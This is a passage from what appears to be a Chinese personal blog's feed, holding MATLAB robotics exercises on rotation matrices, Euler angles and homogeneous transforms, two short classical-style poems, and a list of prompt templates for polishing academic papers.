class="hljs-string">&#x27;R_23 = &#x27;</span>);<br>R_31 = input(<span class="hljs-string">&#x27;R_31 = &#x27;</span>);<br>R_32 = input(<span class="hljs-string">&#x27;R_32 = &#x27;</span>);<br>R_33 = input(<span class="hljs-string">&#x27;R_33 = &#x27;</span>);<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">isempty</span>(R_11) || <span class="hljs-built_in">isempty</span>(R_12) || <span class="hljs-built_in">isempty</span>(R_13) || ...<br>   <span class="hljs-built_in">isempty</span>(R_21) || <span class="hljs-built_in">isempty</span>(R_22) || <span class="hljs-built_in">isempty</span>(R_23) || ...<br>   <span class="hljs-built_in">isempty</span>(R_31) || <span class="hljs-built_in">isempty</span>(R_32) || <span class="hljs-built_in">isempty</span>(R_33)<br>    fprintf(<span class="hljs-string">&#x27;Error! Missing input.\n&#x27;</span>);<br><span class="hljs-keyword">else</span><br>    R = [R_11, R_12, R_13;<br>         R_21, R_22, R_23;<br>         R_31, R_32, R_33];<br>    <br>    <span class="hljs-comment">% 判断是否接近gimbal lock</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(R(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>)) &lt; <span class="hljs-number">1</span><br>        pitch = -<span class="hljs-built_in">asin</span>(R(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>));<br>        roll = <span class="hljs-built_in">atan2</span>(R(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>)/<span class="hljs-built_in">cos</span>(pitch), R(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)/<span class="hljs-built_in">cos</span>(pitch));<br>        yaw  = <span class="hljs-built_in">atan2</span>(R(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)/<span class="hljs-built_in">cos</span>(pitch), R(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)/<span class="hljs-built_in">cos</span>(pitch));<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-comment">% pitch = ±pi/2，Gimbal lock 情况</span><br>        pitch = <span class="hljs-built_in">pi</span>/<span class="hljs-number">2</span> * <span class="hljs-built_in">sign</span>(-R(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>));<br>        roll = <span class="hljs-number">0</span>;<br>        yaw = <span class="hljs-built_in">atan2</span>(-R(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>), R(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>));<br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-comment">% 转为角度</span><br>    roll_deg = rad2deg(roll);<br>    pitch_deg = rad2deg(pitch);<br>    yaw_deg = rad2deg(yaw);<br><br>    fprintf(<span class="hljs-string">&#x27;ZYX欧拉角（角度制）:\n&#x27;</span>);<br>    fprintf(<span class="hljs-string">&#x27;Roll  = %.4f°\n&#x27;</span>, roll_deg);<br>    fprintf(<span class="hljs-string">&#x27;Pitch = %.4f°\n&#x27;</span>, pitch_deg);<br>    fprintf(<span class="hljs-string">&#x27;Yaw   = %.4f°\n&#x27;</span>, yaw_deg);<br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure><h3 id="结果-1">结果</h3><figure><img src="/img/robotics-section-2-practice-1/p_b.png" alt="result_b" /><figcaption aria-hidden="true">result_b</figcaption></figure><h2 id="c">c</h2><h3 id="题目-2">题目</h3><p>仅简单地绕Y轴旋转<spanclass="math inline">\(\beta\)</span>角。已知<spanclass="math inline">\(\beta\)</span>=20°和<spanclass="math inline">\(^BP=\{1, 0, 1\}^T\)</span>，计算<spanclass="math inline">\(^Ap\)</span>;用草图验证结果是否正确。</p><h3 id="解答-2">解答</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">% 定义绕 Y 轴旋转的旋转矩阵（单位为度）</span><br>theta = deg2rad(<span class="hljs-number">20</span>);  <span class="hljs-comment">% 将 20 度转为弧度</span><br>RAB = [ <span class="hljs-built_in">cos</span>(theta), <span class="hljs-number">0</span>, <span class="hljs-built_in">sin</span>(theta);<br>               <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,         <span class="hljs-number">0</span>;<br>       -<span class="hljs-built_in">sin</span>(theta), <span class="hljs-number">0</span>, <span class="hljs-built_in">cos</span>(theta)];<br><br><span class="hljs-comment">% 定义向量 PB</span><br>PB = [<span class="hljs-number">1</span>; <span class="hljs-number">0</span>; <span class="hljs-number">1</span>];<br><br><span class="hljs-comment">% 原始向量起点处画点</span><br><span class="hljs-built_in">plot3</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;color&#x27;</span>, <span class="hljs-string">&#x27;red&#x27;</span>);<br><span class="hljs-built_in">hold</span> on;<br><br><span class="hljs-comment">% 绘制原始向量 PB 的箭头</span><br>quiver3(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, PB(<span class="hljs-number">1</span>), PB(<span class="hljs-number">2</span>), PB(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;LineWidth&#x27;</span>, <span class="hljs-number">1.5</span>);<br><span class="hljs-built_in">hold</span> on;<br><br><span class="hljs-comment">% 旋转后的向量 PA</span><br>PA = RAB * PB;<br><br><span class="hljs-comment">% 绘制旋转后向量 PA 的箭头</span><br><span class="hljs-built_in">plot3</span>(PA(<span class="hljs-number">1</span>), PA(<span class="hljs-number">2</span>), PA(<span class="hljs-number">3</span>), <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;color&#x27;</span>, <span class="hljs-string">&#x27;black&#x27;</span>);<br>quiver3(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, PA(<span class="hljs-number">1</span>), PA(<span class="hljs-number">2</span>), PA(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;LineWidth&#x27;</span>, <span class="hljs-number">1.5</span>);<br><br><span class="hljs-comment">% 定义坐标轴范围</span><br>xlim([<span class="hljs-number">-1</span>, <span class="hljs-number">1.5</span>]);<br>ylim([<span class="hljs-number">-1</span>, <span class="hljs-number">1.5</span>]);<br>zlim([<span class="hljs-number">-1</span>, <span class="hljs-number">1.5</span>]);<br><br><span class="hljs-comment">% 添加坐标轴标签和网格</span><br>xlabel(<span class="hljs-string">&#x27;X&#x27;</span>);<br>ylabel(<span class="hljs-string">&#x27;Y&#x27;</span>);<br>zlabel(<span class="hljs-string">&#x27;Z&#x27;</span>);<br>grid on;<br>axis equal;<br>view(<span class="hljs-number">3</span>);  <span class="hljs-comment">% 三维视角</span><br>title(<span class="hljs-string">&#x27;原始向量与绕Y轴旋转后的向量&#x27;</span>);<br><span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;PB&#x27;</span>, <span class="hljs-string">&#x27;PA&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="结果-2">结果</h3><figure><img src="/img/robotics-section-2-practice-1/p_c.png" alt="result_c" /><figcaption aria-hidden="true">result_c</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>念念望解脱</title>
    <link href="/2025/03/28/%E5%BF%B5%E5%BF%B5%E6%9C%9B%E8%A7%A3%E8%84%B1/"/>
    <url>/2025/03/28/%E5%BF%B5%E5%BF%B5%E6%9C%9B%E8%A7%A3%E8%84%B1/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><center>念念望解脱</center><center>孤途奋力击心火，寂谷竭身炼水山。<center><center>欲锁残声空吐泪，贪吞影月梦回还。<center><hr /><p>灵感来自Tizzy Bac的<ahref="https://open.spotify.com/track/133eJoyLlXE9CEEDav8aoU">《田纳西恰恰》</a>。</p><p><em>我奋力地击打心火，希望有人会听见我。</em></p>]]></content>
    
    
    <categories>
      
      <category>诗词</category>
      
    </categories>
    
    
    <tags>
      
      <tag>七绝</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>robotics section 2 practice 2</title>
    <link href="/2025/03/26/robotics-section-2-practice-2/"/>
    <url>/2025/03/26/robotics-section-2-practice-2/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="robotics-section-2-practice-2">robotics section 2 practice2</h1><h2 id="a">a</h2><h3 id="题目">题目</h3><p>编写matlab程序, 当用户输入Z-Y-X欧拉角<spanclass="math inline">\(\alpha-\beta-\gamma\)</span>和位置矢量<spanclass="math inline">\(^{A}P_{B}\)</span>时, 计算齐次变换矩阵<spanclass="math inline">\(^{A}T_{B}\)</span>.</p><p>实验两个例子:<br />i. <span class="math inline">\(\alpha = 10^{\circ}, \beta = 20^{\circ},\gamma = 30^{\circ}, ^{A}P_{B} = [1, 2, 3]^T\)</span><br />ii. <span class="math inline">\(\alpha = 0^{\circ}, \beta = 20^{\circ},\gamma = 0^{\circ}, ^{A}P_{B} = [3, 0, 1]^T\)</span></p><h3 id="解答">解答</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">%%ZYX欧拉角+P转齐次变换矩阵T</span><br><span class="hljs-comment">%输入角度</span><br>R_z=input(<span class="hljs-string">&#x27;Rotate around the z-axis in alpha =&#x27;</span>);<br>R_y=input(<span class="hljs-string">&#x27;Rotate around the y-axis in beta =&#x27;</span>);<br>R_x=input(<span class="hljs-string">&#x27;Rotate around the x-axis in gamma =&#x27;</span>);<br><span class="hljs-comment">%输入位置矢量</span><br>PBA_x = input (<span class="hljs-string">&#x27;X-axis distance = &#x27;</span>);<br>PBA_y = input (<span class="hljs-string">&#x27;Y-axis distance = &#x27;</span>);<br>PBA_z = input (<span class="hljs-string">&#x27;Z-axis distance = &#x27;</span>);<br><span class="hljs-comment">%只要有一个输入为空，输出警告</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">isempty</span>(R_z)+<span class="hljs-built_in">isempty</span>(R_y)+<span class="hljs-built_in">isempty</span>(R_x)+<span class="hljs-built_in">isempty</span>(PBA_x)+<span class="hljs-built_in">isempty</span>(PBA_y)+<span class="hljs-built_in">isempty</span>(PBA_z)&gt;<span class="hljs-number">0</span><br>    fprintf(<span class="hljs-string">&#x27;Error!&#x27;</span>);<br><span class="hljs-keyword">else</span><br>    R=rotz(R_z)*roty(R_y)*rotx(R_x);<span class="hljs-comment">%ZYX</span><br>    T = [R, [PBA_x; PBA_y; PBA_z]; <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">%T=SE3(R,[PBA_x PBA_y PBA_z]);%输出齐次变换矩阵</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>其中SE3函数是机器人工具箱中的函数, 用于生成齐次变换矩阵.这里是直接手动构造的.</p><h3 id="结果">结果</h3><p><img src="/img/robotics-section-2-practice-2/result_a_i.png"alt="result_a_i" /><br /><img src="/img/robotics-section-2-practice-2/result_a_ii.png"alt="result_a_ii" /></p><h2 id="b">b</h2><h3 id="题目-1">题目</h3><p>已知<span class="math inline">\(\beta=20^{\circ}\)</span>, <spanclass="math inline">\(^{A}P_{B}=[3,0,1]^{T}\)</span>和<spanclass="math inline">\(P_{B}=[1,0,1]^{T}\)</span>, 计算<spanclass="math inline">\(^{A}P\)</span>, 画草图验证结果是否正确.</p><h3 id="解答-1">解答</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">%%ZYX欧拉角+P转齐次变换矩阵T</span><br><span class="hljs-comment">%输入角度</span><br>R_z=input(<span class="hljs-string">&#x27;Rotate around the z-axis in alpha =&#x27;</span>);<br>R_y=input(<span class="hljs-string">&#x27;Rotate around the y-axis in beta =&#x27;</span>);<br>R_x=input(<span class="hljs-string">&#x27;Rotate around the x-axis in gamma =&#x27;</span>);<br><span class="hljs-comment">%输入位置矢量</span><br>PBA_x = input (<span class="hljs-string">&#x27;X-axis distance = &#x27;</span>);<br>PBA_y = input (<span class="hljs-string">&#x27;Y-axis distance = &#x27;</span>);<br>PBA_z = input (<span class="hljs-string">&#x27;Z-axis distance = &#x27;</span>);<br><span class="hljs-comment">%只要有一个输入为空，输出警告</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">isempty</span>(R_z)+<span class="hljs-built_in">isempty</span>(R_y)+<span class="hljs-built_in">isempty</span>(R_x)+<span class="hljs-built_in">isempty</span>(PBA_x)+<span class="hljs-built_in">isempty</span>(PBA_y)+<span class="hljs-built_in">isempty</span>(PBA_z)&gt;<span class="hljs-number">0</span><br>    fprintf(<span class="hljs-string">&#x27;Error!&#x27;</span>);<br><span class="hljs-keyword">else</span><br>    R=rotz(R_z)*roty(R_y)*rotx(R_x);<span class="hljs-comment">%ZYX</span><br>    T = [R, [PBA_x; PBA_y; PBA_z]; <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">%T=SE3(R,[PBA_x PBA_y PBA_z]);%输出齐次变换矩阵</span><br>    PB = [<span class="hljs-number">1</span>; <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; <span class="hljs-number">1</span>]; <span class="hljs-comment">% 齐次坐标下的 PB 点</span><br>    PA = T * PB; <span class="hljs-comment">% 变换后的坐标</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h3 id="结果-1">结果</h3><figure><img src="/img/robotics-section-2-practice-2/result_b.png"alt="result_b" /><figcaption aria-hidden="true">result_b</figcaption></figure><h2 id="c">c</h2><h3 id="题目-2">题目</h3><p>编写一个matlab程序运用符号公式计算齐次变换矩阵的逆矩阵<spanclass="math inline">\(^{A}T_{B}^{-1}=^{B}T_{A}\)</span>.将结果和数值数值函数<spanclass="math inline">\(inv()\)</span>的结果进行比较. 证明两者相等.对a中的两个例子进行验证.</p><h3 id="解答-2">解答</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">%%ZYX欧拉角+P转齐次变换矩阵T</span><br><span class="hljs-comment">%输入角度</span><br>R_z=input(<span class="hljs-string">&#x27;Rotate around the z-axis in alpha =&#x27;</span>);<br>R_y=input(<span class="hljs-string">&#x27;Rotate around the y-axis in beta =&#x27;</span>);<br>R_x=input(<span class="hljs-string">&#x27;Rotate around the x-axis in gamma =&#x27;</span>);<br><span class="hljs-comment">%输入位置矢量</span><br>PBA_x = input (<span class="hljs-string">&#x27;X-axis distance = &#x27;</span>);<br>PBA_y = input (<span class="hljs-string">&#x27;Y-axis distance = &#x27;</span>);<br>PBA_z = input (<span class="hljs-string">&#x27;Z-axis distance = &#x27;</span>);<br><span class="hljs-comment">%只要有一个输入为空，输出警告</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">isempty</span>(R_z)+<span class="hljs-built_in">isempty</span>(R_y)+<span class="hljs-built_in">isempty</span>(R_x)+<span class="hljs-built_in">isempty</span>(PBA_x)+<span class="hljs-built_in">isempty</span>(PBA_y)+<span class="hljs-built_in">isempty</span>(PBA_z)&gt;<span class="hljs-number">0</span><br>    fprintf(<span class="hljs-string">&#x27;Error!&#x27;</span>);<br><span class="hljs-keyword">else</span><br>    R=rotz(R_z)*roty(R_y)*rotx(R_x);<span class="hljs-comment">%ZYX</span><br>    T = [R, [PBA_x; PBA_y; PBA_z]; <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">%T=SE3(R,[PBA_x PBA_y PBA_z]);%输出齐次变换矩阵</span><br>    <span class="hljs-comment">%计算逆矩阵</span><br>    T_inv = inv(T);<br>    <span class="hljs-comment">%符号计算逆矩阵</span><br>    R_inv = R&#x27;; <span class="hljs-comment">% 旋转矩阵的逆矩阵</span><br>    x = -R_inv * [PBA_x; PBA_y; PBA_z]; <span class="hljs-comment">% 位置矢量的逆矩阵</span><br>    T_inv_sym = [R_inv, x; <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">%验证两者是否相等</span><br>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;T_inv = &#x27;</span>);<br>    <span class="hljs-built_in">disp</span>(T_inv);<br>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;T_inv_sym = &#x27;</span>);<br>    <span class="hljs-built_in">disp</span>(T_inv_sym);<br>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;T_inv - T_inv_sym = &#x27;</span>);<br>    <span class="hljs-built_in">disp</span>(T_inv - T_inv_sym);<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h3 id="结果-2">结果</h3><p><img src="/img/robotics-section-2-practice-2/result_c_i.png"alt="result_c_i" /><br /><img src="/img/robotics-section-2-practice-2/result_c_ii.png"alt="result_c_ii" /></p><h2 id="d">d</h2><h3 id="题目-3">题目</h3><p>令<span class="math inline">\(^{A}T_{B}\)</span>为a中i的解, <spanclass="math inline">\(^{B}T_{C}\)</span>为a中ii的解.<br />i. 计算<span class="math inline">\(^{A}T_{C}\)</span>,并用变换图说明关系. 对<spanclass="math inline">\(^{C}T_{A}\)</span>作同样的处理.<br />ii. 已知i中的<span class="math inline">\(^{A}T_{C}\)</span>和<spanclass="math inline">\(^{B}T_{C}\)</span>, 假定<spanclass="math inline">\(^{A}T_{B}\)</span>未知,计算它并与已知的答案进行比较.<br />iii. 已知i中的<span class="math inline">\(^{A}T_{C}\)</span>和<spanclass="math inline">\(^{A}T_{B}\)</span>, 假定<spanclass="math inline">\(^{B}T_{C}\)</span>未知,计算它并与已知的答案进行比较.</p><h3 id="解答-3">解答</h3><ol type="i"><li><span class="math display">\[^{A}T_{C} = ^{A}T_{B} \cdot ^{B}T_{C} = \begin{bmatrix} R_{A} &amp;P_{A} \\ 0 &amp; 1 \end{bmatrix} \begin{bmatrix} R_{B} &amp; P_{B} \\ 0&amp; 1 \end{bmatrix} = \begin{bmatrix} R_{A} \cdot R_{B} &amp; R_{A}\cdot P_{B} + P_{A} \\ 0 &amp; 1 \end{bmatrix}\]</span></li></ol><p><span class="math display">\[^{C}T_{A} = (^{A}T_{C})^{-1} = (^{A}T_{B} \cdot ^{B}T_{C})^{-1} =\begin{bmatrix} R_{A} \cdot R_{B} &amp; R_{A} \cdot P_{B} + P_{A} \\ 0&amp; 1 \end{bmatrix}^{-1} = \begin{bmatrix} R_{B}^{T} &amp; -R_{B}^{T}\cdot P_{B} \\ 0 &amp; 1 \end{bmatrix}\]</span></p><ol start="2" type="i"><li><p><span class="math display">\[^{A}T_{B} = ^{A}T_{C} \cdot ^{C}T_{B} = \begin{bmatrix} R_{A} \cdotR_{C} &amp; R_{A} \cdot P_{C} + P_{A} \\ 0 &amp; 1 \end{bmatrix}\begin{bmatrix} R_{C} &amp; P_{C} \\ 0 &amp; 1 \end{bmatrix} =\begin{bmatrix} R_{A} &amp; P_{A} \\ 0 &amp; 1 \end{bmatrix}\]</span></p></li><li><p><span class="math display">\[^{B}T_{C} = ^{B}T_{A} \cdot ^{A}T_{C} = \begin{bmatrix} R_{B} &amp;P_{B} \\ 0 &amp; 1 \end{bmatrix} \begin{bmatrix} R_{A} &amp; P_{A} \\ 0&amp; 1 \end{bmatrix} = \begin{bmatrix} R_{C} &amp; P_{C} \\ 0 &amp; 1\end{bmatrix}\]</span></p></li></ol><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs matlab">TAB = [ <span class="hljs-number">0.9254</span>    <span class="hljs-number">0.0180</span>    <span class="hljs-number">0.3785</span>    <span class="hljs-number">1</span>;<br>        <span class="hljs-number">0.1632</span>    <span class="hljs-number">0.8826</span>   <span class="hljs-number">-0.4410</span>    <span class="hljs-number">2</span>;<br>       <span class="hljs-number">-0.3420</span>    <span class="hljs-number">0.4698</span>    <span class="hljs-number">0.8138</span>    <span class="hljs-number">3</span>;<br>        <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">1</span>];<br><br>TBC = [ <span class="hljs-number">0.9397</span>     <span class="hljs-number">0</span>    <span class="hljs-number">0.3420</span>         <span class="hljs-number">3</span>;<br>         <span class="hljs-number">0</span>         <span class="hljs-number">1</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>;<br>        <span class="hljs-number">-0.3420</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0.9397</span>         <span class="hljs-number">1</span>;<br>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">0</span>         <span class="hljs-number">1</span>];<br><br>TAC = TAB * TBC;<br><br><span class="hljs-built_in">disp</span>(TAC)<br></code></pre></td></tr></table></figure><h3 id="结果-3">结果</h3><figure><img src="/img/robotics-section-2-practice-2/result_d.png"alt="result_d" /><figcaption aria-hidden="true">result_d</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不解樱情</title>
    <link href="/2025/03/25/%E4%B8%8D%E8%A7%A3%E6%A8%B1%E6%83%85/"/>
    <url>/2025/03/25/%E4%B8%8D%E8%A7%A3%E6%A8%B1%E6%83%85/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><center>不解樱情</center><center>雪逝素樱残影断，流光谁遣坠梦间？</center><center>平生不解逐芳事，一夜风来却倚栏。</center><figure><img src="/img/不解樱情/cherry.jpg" alt="cherry" /><figcaption aria-hidden="true">cherry</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>诗词</category>
      
    </categories>
    
    
    <tags>
      
      <tag>七绝</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文润色</title>
    <link href="/2025/02/28/%E8%AE%BA%E6%96%87%E6%B6%A6%E8%89%B2/"/>
    <url>/2025/02/28/%E8%AE%BA%E6%96%87%E6%B6%A6%E8%89%B2/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="论文润色">论文润色</h2><h3 id="论证逻辑与结构优化">1. 论证逻辑与结构优化</h3><p>请分析以下段落的论证逻辑，[插入论文段落]。重点关注论证是否严密，逻辑是否清晰，论据是否充分支持论点。请提出改进建议，包括但不限于：调整论证结构，补充关键论据，澄清逻辑跳跃，并确保论证符合学术论文的严谨性标准。最终输出应为润色后的段落，并附带修改建议的简要说明。</p><h3 id="概念定义与术语规范">2. 概念定义与术语规范</h3><p>请检查以下段落中关键概念的定义和术语的使用，[插入论文段落]。确保概念定义清晰、准确、符合学术界通用标准，术语使用规范、一致。如有歧义或不规范之处，请提出修改建议并提供更精准的学术术语替换方案。最终输出应为润色后的段落，并标明修改的概念和术语。</p><h3 id="研究方法描述的严谨性提升">3. 研究方法描述的严谨性提升</h3><p>请评估以下研究方法描述的严谨性和可重复性，[插入论文段落]。检查方法描述是否详细、具体、逻辑清晰，是否充分说明了研究设计的合理性和科学性。请提出改进建议，例如：补充方法细节，明确操作步骤，强调控制变量，并确保方法描述符合学术研究的规范要求。最终输出应为润色后的段落，并指出需要补充或修改的方法细节。</p><h3 id="文献综述的深度与批判性分析">4. 文献综述的深度与批判性分析</h3><p>请分析以下文献综述段落的深度和批判性，[插入论文段落]。评估文献综述是否充分展现了研究领域的最新进展和主要争议，是否对现有研究进行了批判性分析和评价，并明确指出本研究的学术贡献和创新之处。请提出改进建议，例如：补充关键文献，深化批判性分析，突出研究的独特性。最终输出应为润色后的段落，并说明如何提升文献综述的深度和批判性。</p><h3 id="数据分析结果的客观性与解读">5. 数据分析结果的客观性与解读</h3><p>请检查以下数据分析结果的呈现和解读是否客观、严谨，[插入论文段落]。确保数据呈现方式清晰易懂，数据解读基于事实，避免过度解读或主观臆断。请提出改进建议，例如：优化数据图表，补充必要的统计指标，修正不严谨的解读，并确保数据分析结果的呈现符合学术规范。最终输出应为润色后的段落，并指出需要修改的数据呈现或解读方式。</p><h3 id="结论的严谨性与创新性强调">6. 结论的严谨性与创新性强调</h3><p>请评估以下结论段落的严谨性和创新性，[插入论文段落]。检查结论是否基于研究结果，是否逻辑严密，是否准确概括了研究的主要发现，并清晰地强调了研究的学术价值和创新贡献。请提出改进建议，例如：增强结论的严谨性，更突出研究的创新点，并确保结论与研究目标和研究结果高度一致。最终输出应为润色后的段落，并说明如何提升结论的严谨性和创新性表达。</p><h3 id="学术语言的规范性与流畅性">7. 学术语言的规范性与流畅性</h3><p>请润色以下段落的学术语言，[插入论文段落]。重点提升语言的规范性、准确性、流畅性和专业性。替换口语化表达，优化句子结构，增强学术语气的正式感和客观性。最终输出应为润色后的段落，并简要说明语言润色的重点。</p><h3 id="段落之间的逻辑过渡与连贯性">8. 段落之间的逻辑过渡与连贯性</h3><p>请检查以下段落之间的逻辑过渡和连贯性，[插入论文段落]。确保段落之间衔接自然，逻辑流畅，论证思路清晰。如有过渡不自然或逻辑断裂之处，请提出修改建议，例如：增加过渡句，调整段落顺序，补充逻辑连接词。最终输出应为润色后的段落，并指出需要改进的逻辑过渡之处。</p><h3 id="避免歧义与提升表达精确性">9. 避免歧义与提升表达精确性</h3><p>请检查以下段落是否存在歧义或表达不精确之处，[插入论文段落]。确保语句表达清晰明确，避免产生多种理解，提升表达的精确性和专业性。请提出修改建议，例如：替换模糊词汇，明确指代关系，细化描述细节。最终输出应为润色后的段落，并指出需要修改的歧义或不精确表达。</p><h3 id="参考文献引用的规范性检查">10. 参考文献引用的规范性检查</h3><p>请检查以下段落中参考文献的引用是否规范，[插入论文段落]。确保参考文献格式符合目标期刊或学术规范要求，引用信息完整准确，避免遗漏或错误引用。请提出修改建议，例如：修正引用格式，补充缺失信息，核对引用准确性。最终输出应为润色后的段落，并指出需要修改的参考文献引用。</p><h3 id="研究局限性与未来研究方向的客观分析">11.研究局限性与未来研究方向的客观分析</h3><p>请评估以下研究局限性与未来研究方向的分析是否客观、深入，[插入论文段落]。确保对研究局限性的分析坦诚、客观，对未来研究方向的展望具有学术价值和可行性。请提出改进建议，例如：更深入地分析研究局限性，提出更具体、更有价值的未来研究方向。最终输出应为润色后的段落，并说明如何提升研究局限性与未来研究方向分析的质量。</p><h3 id="摘要的精炼与信息完整性">12. 摘要的精炼与信息完整性</h3><p>请润色以下摘要，[插入论文摘要]。确保摘要精炼、准确、完整地概括论文的核心内容，包括研究目的、方法、主要发现和结论。突出研究的创新性和学术价值，并符合学术论文摘要的写作规范。最终输出应为润色后的摘要，并简要说明润色重点。</p><h3 